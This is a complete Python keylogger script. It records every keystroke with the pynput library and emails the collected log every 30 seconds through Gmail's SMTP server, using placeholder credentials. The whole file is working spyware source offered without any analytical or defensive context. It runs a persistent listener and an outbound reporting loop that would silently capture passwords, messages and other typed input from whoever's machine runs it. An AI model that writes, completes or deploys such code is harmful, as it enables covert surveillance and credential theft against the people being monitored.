#!/usr/bin/env python

import pynput.keyboard, threading, smtplib


class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = "[+]Keylogger Started...!!!"
        self.interval = time_interval
        self.email = email
        self.password = password
    #appends keystroke to log attribute
    def append_log(self, key_log):
        self.log = self.log + key_log

    #processes and makes the keystrokes readable    
    def key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)
    
    #sends mail in the given time interval
    def report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    #sends email to the specified person    
    def send_email(self, email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email, message)
        server.quit()
    #starts the main process
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

key_logger = Keylogger(30, "email", "password")
key_logger.start()

